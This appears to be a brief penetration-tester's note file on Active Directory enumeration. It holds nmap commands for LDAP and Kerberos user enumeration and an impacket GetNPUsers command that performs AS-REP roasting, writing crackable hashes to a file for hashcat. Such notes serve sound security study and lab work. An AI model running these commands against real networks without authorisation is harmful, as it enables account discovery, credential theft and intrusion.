# Services

- check smb shares, see ../windows/smbmap.md
- check enum4linux, see ./enum4linux.md


# enumerate LDAP

```bash
nmap -n -sV --script "ldap* and not brute" -p 389 $rhost
```

# enumerate users with kerberos

```bash
nmap -p 88 --script=krb5-enum-users --script-args krb5-enum-users.realm='<some.domain>',userdb=/usr/share/seclists/Usernames/cirt-default-usernames.txt $rhost
```

# enumerate with AS_REP message

```bash
python3 /usr/share/doc/python3-impacket/examples/GetNPUsers.py <some.domain>/ -usersfile /usr/share/seclists/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt -format hashcat -outputfile hashes.asreproast
```
